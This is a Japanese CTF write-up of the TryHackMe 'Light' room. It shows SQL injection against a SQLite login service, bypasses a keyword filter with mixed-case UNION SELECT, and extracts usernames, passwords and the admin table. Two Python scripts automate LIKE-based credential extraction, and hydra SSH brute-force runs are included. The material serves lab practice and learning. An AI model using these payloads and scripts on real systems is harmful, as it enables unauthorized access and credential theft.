# Light CTF

https://tryhackme.com/r/room/lightroom

```text
I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.10.9.26 1337
You can use the username smokey in order to get started.
```

```shell
$ nc 10.10.9.26 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: admin
Username not found.
```

ユーザー名を指示通りsmokeyと入力したら、パスワードが表示される。  
実在しないユーザー名を入力したら not found と表示される。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.9.26

root@ip-10-10-179-203:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-18 07:47 GMT
Nmap scan report for 10.10.9.26
Host is up (0.00043s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 02:B8:0F:AB:EB:D1 (Unknown)
```

SSHと1337ポートのみ。

```shell
$ ssh smokey@10.10.9.26    
The authenticity of host '10.10.9.26 (10.10.9.26)' can't be established.
ED25519 key fingerprint is SHA256:BD7uZfA2E7FwfzJpcn+1aMFE4APLItRTSrsiUHImRz4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.9.26' (ED25519) to the list of known hosts.
smokey@10.10.9.26's password: 
Permission denied, please try again.
```
vYQ5ngPpw8AdUmL はSSHのパスワードではない。

## SQLi

```shell
Please enter your username: smokey' or '1'='1
Password: tF8tj2o94WE4LKC
```
違うパスワードが出てきたので、SQLインジェクションの脆弱性がある。

```shell
Please enter your username: smokey' union select '1
Ahh there is a word in there I don't like :(

Please enter your username: smokey' UnIon SeLect '1
Password: 1

Please enter your username: smokey' UnIon SeLect 1, '2
Error: SELECTs to the left and right of UNION do not have the same number of result columns
```

- キーワードの大文字小文字を混在することでフィルターを回避できる。
- Selectしている列数は1個

```shell
Please enter your username: smokey' UnIon SeLect DaTabase() --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

SQLコメントはフィルターされている。

```shell
Please enter your username: smokey' UnIon SeLect database(); '     
Error: no such function: database

Please enter your username: smokey' UnIon SeLect group_concat(table_name) FROM information_schema.tables; '
Error: no such table: information_schema.tables

Please enter your username: smokey' UnIon SeLect group_concat(tablename) FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema'); '
Error: no such table: pg_catalog.pg_tables
```

MySQLでもPostgreでもなさそう。

```shell
smokey' UnIon SeLect group_concat(name) FROM sqlite_master WHERE type = 'table'; '

smokey' UnIon SeLect name FROM sqlite_master WHERE type = 'table'; '

smokey' UnIon SeLect GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name'); '
```

応答が返らないのでSQLiteであることは間違いないと思う。

```shell
Please enter your username: noexist' or username like 's%
Password: vYQ5ngPpw8AdUmL
```
この方法を繰り返せば有効なユーザー名を割り出せそう。（がんばれば・・・）


```shell
Please enter your username: noexist' or username like 'al%
Password: tF8tj2o94WE4LKC

Please enter your username: noexist' or username like 'h%
Password: EcSuU35WlVipjXG

Please enter your username: noexist' or username like 'j%
Password: e74tqwRh2oApPo6

Please enter your username: noexist' or username like 'm%
Password: 7DV4dwA0g5FacRe

Please enter your username: noexist' or username like 'r%
Password: yAn4fPaF2qpCKpR

Please enter your username: noexist' or username like 's%
Password: vYQ5ngPpw8AdUmL
```

少なくとも６ユーザーは存在することが分かった。  
手作業は２文字見つけるだけでも大変だったので、プログラムを作った。

```python
import socket
import time

def tcp_string_loop(ip, port):
    # 接続先IPアドレスとポート
    server_address = (ip, port)

    try:
        # ソケット作成
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # サーバーに接続
            sock.connect(server_address)

            time.sleep(3)
            
            # サーバーからの応答を受信
            response = sock.recv(1024).decode().strip()

            # 初期値
            current_string = "a"

            while True:
                time.sleep(0.5)

                # サーバーに文字列を送信
                #print(f"Sending: {current_string}")
                payload = f"noexist' or username like '{current_string}%"
                #print(f"payload: {payload}")
                sock.sendall(payload.encode())
                #sock.sendall(current_string)

                time.sleep(0.5)
                
                # サーバーからの応答を受信
                response = sock.recv(1024).decode().strip()
                #print(f"Received: {response}")

                # マッチするusernameが存在する
                if "Password" in response or "Welcome to the Light database" in response:
                    if "Password" in response:
                        print(f"match: {current_string}")
                    # 末尾に 'a' を足す
                    current_string += 'a'
                elif "Username not found" in response:
                    # 末尾の 'z' をすべて削除
                    current_string = current_string.rstrip('z')

                    # 末尾を1文字進める
                    if current_string:
                        last_char = current_string[-1]
                        current_string = current_string[:-1] + chr(ord(last_char) + 1)
                        #print(f"{current_string}")
                    else:
                        # 文字列が空になった場合終了
                        print("String became empty. Exiting.")
                        break
                else:
                    print(f"Received: {response}")
                    print("Unexpected response received. Exiting loop.")
                    break

    except Exception as e:
        print(f"Error: {e}")

# 使用例（IPアドレスとポートを指定）
tcp_string_loop("10.10.11.43", 1337)
```

8人のユーザーが出てきた。  

```shell
$ python ./sqli.py
match: a
match: al
match: ali
match: alic
match: alice
match: h
match: ha
match: haz
match: haze
match: hazel
match: j
match: jo
match: joh
match: john
match: m
match: mi
match: mic
match: mich
match: micha
match: michae
match: michael
match: r
match: ra
match: ral
match: ralp
match: ralph
match: ro
match: rob
match: s
match: sm
match: smo
match: smok
match: smoke
match: smokey
match: st
match: ste
match: stev
match: steve
String became empty. Exiting.
```

それぞれのパスワードを出してみる。

```shell
$ nc 10.10.11.43 1337                                                         
Welcome to the Light database!
Please enter your username: alice
Password: tF8tj2o94WE4LKC
Please enter your username: hazel
Password: EcSuU35WlVipjXG
Please enter your username: john
Password: e74tqwRh2oApPo6
Please enter your username: michael
Password: 7DV4dwA0g5FacRe
Please enter your username: ralph
Password: YO1U9O1m52aJImA
Please enter your username: rob
Password: yAn4fPaF2qpCKpR
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: steve
Password: WObjufHX1foR8d7
```

そもそも問われている管理者ユーザー名は１４文字あるので足りていないと思われる。  
たぶん、アルファベットのみで検索したのが原因。  
数字と記号が含まれているかを確認。

```shell
$ nc 10.10.11.43 1337
Welcome to the Light database!
Please enter your username: noexist' or username like '%1%
Username not found.
Please enter your username: noexist' or username like '%2%
Username not found.
Please enter your username: noexist' or username like '%3%
Username not found.
Please enter your username: noexist' or username like '%4%
Username not found.
Please enter your username: noexist' or username like '%5%
Username not found.
Please enter your username: noexist' or username like '%6%
Username not found.
Please enter your username: noexist' or username like '%7%
Username not found.
Please enter your username: noexist' or username like '%8%
Username not found.
Please enter your username: noexist' or username like '%9%
Username not found.
Please enter your username: noexist' or username like '%0%
Username not found.
Please enter your username: noexist' or username like '%!%    
Username not found.
Please enter your username: noexist' or username like '%"%
Username not found.
Please enter your username: noexist' or username like '%#%
Username not found.
Please enter your username: noexist' or username like '%&%
Username not found.
Please enter your username: noexist' or username like '%(%
Username not found.
Please enter your username: noexist' or username like '%)%
Username not found.
Please enter your username: noexist' or username like '%*%
Username not found.
Please enter your username: noexist' or username like '%+%
Username not found.
Please enter your username: noexist' or username like '%,%
Username not found.
Please enter your username: noexist' or username like '%-%
Username not found.
Please enter your username: noexist' or username like '%.%
Username not found.
Please enter your username: noexist' or username like '%/%
Username not found.
Please enter your username: noexist' or username like '%:%
Username not found.
Please enter your username: noexist' or username like '%;%
Username not found.
Please enter your username: noexist' or username like '%<%
Username not found.
Please enter your username: noexist' or username like '%=%
Username not found.
Please enter your username: noexist' or username like '%>%
Username not found.
Please enter your username: noexist' or username like '%?%
Username not found.
Please enter your username: noexist' or username like '%[%
Username not found.
Please enter your username: noexist' or username like '%\%
Username not found.
Please enter your username: noexist' or username like '%@%
Username not found.
Please enter your username: noexist' or username like '%]%
Username not found.
Please enter your username: noexist' or username like '%^%
Username not found.
Please enter your username: noexist' or username like '%_%
Password: tF8tj2o94WE4LKC
Please enter your username: noexist' or username like '%`%
Username not found.
Please enter your username: noexist' or username like '%{%
Username not found.
Please enter your username: noexist' or username like '%|%
Username not found.
Please enter your username: noexist' or username like '%}%
Username not found.
Please enter your username: noexist' or username like '%~%
Username not found.
Please enter your username: noexist' or username like '%\%%' escape '\
Username not found.
```

```shell
$ nc 10.10.11.43 1337  
Welcome to the Light database!
Please enter your username: ______l
Username not found.
Please enter your username: noexist' or username like '______l%
Password: 7DV4dwA0g5FacRe
Please enter your username: noexist' or username like '______L%
Password: 7DV4dwA0g5FacRe
Please enter your username: noexist' or username like '% %
Username not found.
Please enter your username: noexist' or username like '%\t%
Username not found.
Please enter your username: noexist' or username like '%' + CHAR(9)+ '%
Username not found.
Please enter your username: noexist' or username like '%' + CHAR(10)+ '%
Username not found.
Please enter your username: noexist' or username like '%' + CHAR(11)+ '%
Username not found.
Please enter your username: noexist' or username like '%' + CHAR(32)+ '%
Username not found.
Please enter your username: noexist' or username like '%' + CHAR(13)+ '%
Username not found.
```

アンダースコアが含まれていることが分かった。（間違い）

```text
Please enter your username: noexist' or username like '%_%
Password: tF8tj2o94WE4LKC
```

まだ何か含まれている文字がある。

```text
Please enter your username: ______l
Username not found.

Please enter your username: ______L
Username not found.

Please enter your username: noexist' or username like '______l%
Password: 7DV4dwA0g5FacRe
```

→ アンダースコアはLIKEの中で「任意の1文字にマッチする」特殊文字だった。______l は michaelにマッチしていただけだった・・・  

アンダースコアも％もユーザー名には含まれていないと結論。

```shell
noexist' or username like '%\%%' escape '\
noexist' or username like '%\_%' escape '\
```

ユーザー名は最大7文字であることが分かる。  
14文字の管理者ユーザー名は、ここからは絶対に出てこない。

```shell
$ nc 10.10.233.5 1337
Welcome to the Light database!
Please enter your username: noexist' or username like '_
Username not found.
Please enter your username: noexist' or username like '__
Username not found.
Please enter your username: noexist' or username like '___
Password: yAn4fPaF2qpCKpR
Please enter your username: noexist' or username like '____
Password: e74tqwRh2oApPo6
Please enter your username: noexist' or username like '_____
Password: tF8tj2o94WE4LKC
Please enter your username: noexist' or username like '______
Password: vYQ5ngPpw8AdUmL
Please enter your username: noexist' or username like '_______
Password: 7DV4dwA0g5FacRe
Please enter your username: noexist' or username like '________
Username not found.
Please enter your username: noexist' or username like '_________
Username not found.
Please enter your username: noexist' or username like '_________%
Username not found.
```

これ以外のユーザー名が出てくる見込みはもうない。
```text
alice
hazel
john
michael
ralph
rob
smokey
steve
```

### 次の方針

- テーブル名、列名等のメタ情報取得を目指す
- ユーザー名を何かに使う
- パスワードに何らかの変換をして使えるようにする
- 隠されているポートのログインで使う
- DBアプリケーション自体に隠しコマンドがある


## パスワードを使う
```text
alice
tF8tj2o94WE4LKC
```
を考える。  

### ROT13ブルートフォース

```text
Amount =  1: uG9uk3p05XF5MLD
Amount =  2: vH0vl4q16YG6NME
Amount =  3: wI1wm5r27ZH7ONF
Amount =  4: xJ2xn6s38AI8POG
Amount =  5: yK3yo7t49BJ9QPH
Amount =  6: zL4zp8u50CK0RQI
Amount =  7: aM5aq9v61DL1SRJ
Amount =  8: bN6br0w72EM2TSK
Amount =  9: cO7cs1x83FN3UTL
Amount = 10: dP8dt2y94GO4VUM
Amount = 11: eQ9eu3z05HP5WVN
Amount = 12: fR0fv4a16IQ6XWO
Amount = 13: gS1gw5b27JR7YXP
Amount = 14: hT2hx6c38KS8ZYQ
Amount = 15: iU3iy7d49LT9AZR
Amount = 16: jV4jz8e50MU0BAS
Amount = 17: kW5ka9f61NV1CBT
Amount = 18: lX6lb0g72OW2DCU
Amount = 19: mY7mc1h83PX3EDV
Amount = 20: nZ8nd2i94QY4FEW
Amount = 21: oA9oe3j05RZ5GFX
Amount = 22: pB0pf4k16SA6HGY
Amount = 23: qC1qg5l27TB7IHZ
Amount = 24: rD2rh6m38UC8JIA
Amount = 25: sE3si7n49VD9KJB
```

このリストを使ってhydraでSSHブルートフォースしたが、ヒットせず。

```shell
└─$ hydra -l alice -P ./pass.txt 10.10.233.5 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-18 21:42:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 25 tasks per 1 server, overall 25 tasks, 25 login tries (l:1/p:25), ~1 try per task
[DATA] attacking ssh://10.10.233.5:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-18 21:42:29
```

### ROT47ブルートフォース

```text
Amount =  1: uG9uk3p:5XF5MLD
Amount =  2: vH:vl4q;6YG6NME
Amount =  3: wI;wm5r<7ZH7ONF
Amount =  4: xJ<xn6s=8[I8POG
Amount =  5: yK=yo7t>9\J9QPH
Amount =  6: zL>zp8u?:]K:RQI
Amount =  7: {M?{q9v@;^L;SRJ
Amount =  8: |N@|r:wA<_M<TSK
Amount =  9: }OA}s;xB=`N=UTL
Amount = 10: ~PB~t<yC>aO>VUM
Amount = 11: !QC!u=zD?bP?WVN
Amount = 12: "RD"v>{E@cQ@XWO
Amount = 13: #SE#w?|FAdRAYXP
Amount = 14: $TF$x@}GBeSBZYQ
Amount = 15: %UG%yA~HCfTC[ZR
Amount = 16: &VH&zB!IDgUD\[S
Amount = 17: 'WI'{C"JEhVE]\T
Amount = 18: (XJ(|D#KFiWF^]U
Amount = 19: )YK)}E$LGjXG_^V
Amount = 20: *ZL*~F%MHkYH`_W
Amount = 21: +[M+!G&NIlZIa`X
Amount = 22: ,\N,"H'OJm[JbaY
Amount = 23: -]O-#I(PKn\KcbZ
Amount = 24: .^P.$J)QLo]Ldc[
Amount = 25: /_Q/%K*RMp^Med\
Amount = 26: 0`R0&L+SNq_Nfe]
Amount = 27: 1aS1'M,TOr`Ogf^
Amount = 28: 2bT2(N-UPsaPhg_
Amount = 29: 3cU3)O.VQtbQih`
Amount = 30: 4dV4*P/WRucRjia
Amount = 31: 5eW5+Q0XSvdSkjb
Amount = 32: 6fX6,R1YTweTlkc
Amount = 33: 7gY7-S2ZUxfUmld
Amount = 34: 8hZ8.T3[VygVnme
Amount = 35: 9i[9/U4\WzhWonf
Amount = 36: :j\:0V5]X{iXpog
Amount = 37: ;k];1W6^Y|jYqph
Amount = 38: <l^<2X7_Z}kZrqi
Amount = 39: =m_=3Y8`[~l[srj
Amount = 40: >n`>4Z9a\!m\tsk
Amount = 41: ?oa?5[:b]"n]utl
Amount = 42: @pb@6\;c^#o^vum
Amount = 43: AqcA7]<d_$p_wvn
Amount = 44: BrdB8^=e`%q`xwo
Amount = 45: CseC9_>fa&rayxp
Amount = 46: DtfD:`?gb'sbzyq
Amount = 47: EugE;a@hc(tc{zr
Amount = 48: FvhF<bAid)ud|{s
Amount = 49: GwiG=cBje*ve}|t
Amount = 50: HxjH>dCkf+wf~}u
Amount = 51: IykI?eDlg,xg!~v
Amount = 52: JzlJ@fEmh-yh"!w
Amount = 53: K{mKAgFni.zi#"x
Amount = 54: L|nLBhGoj/{j$#y
Amount = 55: M}oMCiHpk0|k%$z
Amount = 56: N~pNDjIql1}l&%{
Amount = 57: O!qOEkJrm2~m'&|
Amount = 58: P"rPFlKsn3!n('}
Amount = 59: Q#sQGmLto4"o)(~
Amount = 60: R$tRHnMup5#p*)!
Amount = 61: S%uSIoNvq6$q+*"
Amount = 62: T&vTJpOwr7%r,+#
Amount = 63: U'wUKqPxs8&s-,$
Amount = 64: V(xVLrQyt9't.-%
Amount = 65: W)yWMsRzu:(u/.&
Amount = 66: X*zXNtS{v;)v0/'
Amount = 67: Y+{YOuT|w<*w10(
Amount = 68: Z,|ZPvU}x=+x21)
Amount = 69: [-}[QwV~y>,y32*
Amount = 70: \.~\RxW!z?-z43+
Amount = 71: ]/!]SyX"{@.{54,
Amount = 72: ^0"^TzY#|A/|65-
Amount = 73: _1#_U{Z$}B0}76.
Amount = 74: `2$`V|[%~C1~87/
Amount = 75: a3%aW}\&!D2!980
Amount = 76: b4&bX~]'"E3":91
Amount = 77: c5'cY!^(#F4#;:2
Amount = 78: d6(dZ"_)$G5$<;3
Amount = 79: e7)e[#`*%H6%=<4
Amount = 80: f8*f\$a+&I7&>=5
Amount = 81: g9+g]%b,'J8'?>6
Amount = 82: h:,h^&c-(K9(@?7
Amount = 83: i;-i_'d.)L:)A@8
Amount = 84: j<.j`(e/*M;*BA9
Amount = 85: k=/ka)f0+N<+CB:
Amount = 86: l>0lb*g1,O=,DC;
Amount = 87: m?1mc+h2-P>-ED<
Amount = 88: n@2nd,i3.Q?.FE=
Amount = 89: oA3oe-j4/R@/GF>
Amount = 90: pB4pf.k50SA0HG?
Amount = 91: qC5qg/l61TB1IH@
Amount = 92: rD6rh0m72UC2JIA
Amount = 93: sE7si1n83VD3KJB
```

ヒットせず。パスワードの使い場所が分からない。

```shell
$ hydra -l alice -P ./pass.txt 10.10.233.5 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-18 21:49:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 93 login tries (l:1/p:93), ~4 tries per task
[DATA] attacking ssh://10.10.233.5:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-18 21:49:40
```

## 再びSQLi

sqlite_master からメタ情報取得できた。  
（前回は ;' を末尾につけていたのが原因でSQLが完結していなかった）

```shell
Please enter your username: noexist' UnIon SeLect GroUp_cOncAt(name) FROM sQliTe_mAStEr WHERE type = 'table
Password: usertable,admintable
```

usertable,admintableの2テーブルが存在することが判明。

### 列名

```shell
Please enter your username: noexist' UnIon SeLect GroUp_cOncAt(sql) FROM sQliTe_mAStEr WHERE type != 'meta' and sql notnull and name = 'usertable
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

```shell
Please enter your username: noexist' UnIon SeLect GroUp_cOncAt(sql) FROM sQliTe_mAStEr WHERE type != 'meta' and sql notnull and name = 'admintable
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

### admintable

```shell
Please enter your username: noexist' UnIon SeLect GroUp_cOncAt(username) FROM admintable WHERE '1' = '1
Password: TryHackMeAdmin,flag

Please enter your username: noexist' UnIon SeLect GroUp_cOncAt(password) FROM admintable WHERE '1' = '1
Password: mam....,THM{S...}
```

そのままフラグが入っていた。


## 振り返り

- sqlite_masterの応答がない件をすこし深堀りすれば苦も無くクリアできたはずのところを、めちゃくちゃ遠回りしてしまった。大反省。
- ポジティブにとらえれば、スムーズにクリアするより良い勉強にはなった。
- 将来のためにSQLiスクリプトを改良した。

### 改良版のSQLiスクリプト
- Sleepではなく、応答を読んで即座に次ぎに行くようにした
- アンダースコア、% をエスケープして、含まれていても対応できるようにした

```python
import socket
import time
import string

def wait_for_message(sock, expected_message):
    try:
        # メッセージ受信バッファ
        buffer = ""
        
        while True:
            # データを受信
            data = sock.recv(1024).decode('utf-8')  # 1回の受信で最大1024バイト
            if not data:  # 接続が切れた場合
                #print("Connection closed by the server.")
                break
            
            # 受信データをバッファに追加
            buffer += data
            
            # 期待するメッセージが含まれているか確認
            if expected_message in buffer:
                #print(f"Received expected message: {expected_message}")
                break
            
    except Exception as e:
        print(f"An error occurred: {e}")

    return buffer


def replace_wildcard_with_escape(input_string):
    """
    :param input_string: 対象の文字列
    :return: 変換後の文字列
    """
    tmp = input_string.replace('%', r"\%")
    return tmp.replace('_', r"\_")


def clean_password_prompt(input_string):
    """ 文字列の先頭にある 'Password: ' と改行以降を削除する。

    :param input_string: 対象の文字列
    :return: 修正後の文字列
    """
    if input_string.startswith("Password: "):
        # "Password: " を取り除き、改行以前の部分を抽出
        return input_string.replace("Password: ", "").split("\n", 1)[0]
    return input_string



def tcp_string_loop(ip, port):
    # 接続先IPアドレスとポート
    server_address = (ip, port)

    try:
        # ソケット作成
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # サーバーに接続
            sock.connect(server_address)
            response = wait_for_message(sock, "Please enter your username: ")

            characters = "_" + "%" + string.ascii_lowercase + "0123456789"
            
            # 初期値
            current_string = "_"

            while True:
                # サーバーに文字列を送信
                #print(f"Sending: {current_string}")
                replaced_string = replace_wildcard_with_escape(current_string)

                payload = f"noexist' or username like '{replaced_string}%' ESCAPE '\\"
                #print(f"payload: {payload}")
                sock.sendall(payload.encode())
                #sock.sendall(current_string)

                # サーバーからの応答を受信
                response = wait_for_message(sock, "Please enter your username: ")
                #print(f"Received: {response}")

                # パスワードが表示される（マッチするusernameが存在する）
                if "Password" in response:
                    passwd = clean_password_prompt(response)
                    print(f"match: {current_string}    : {passwd}")
                    # 末尾に 'a' を足す
                    current_string += characters[0]
                elif "Username not found" in response:
                    # 末尾の最後の文字セットの文字をすべて削除
                    while current_string and current_string[-1] == characters[-1]:
                        current_string = current_string[:-1]

                    # 末尾を1文字進める
                    if current_string:
                        last_char = current_string[-1]
                        next_char_index = characters.index(last_char) + 1
                        current_string = current_string[:-1] + characters[next_char_index]
                        #print(f"{current_string}")
                    else:
                        # 文字列が空になった場合終了
                        print("String became empty. Exiting.")
                        break
                else:
                    print(f"Received: {response}")
                    print("Unexpected response received. Exiting loop.")
                    break

    except Exception as e:
        print(f"Error: {e}")

# 使用例（IPアドレスとポートを指定）
tcp_string_loop("10.10.233.5", 1337)
```
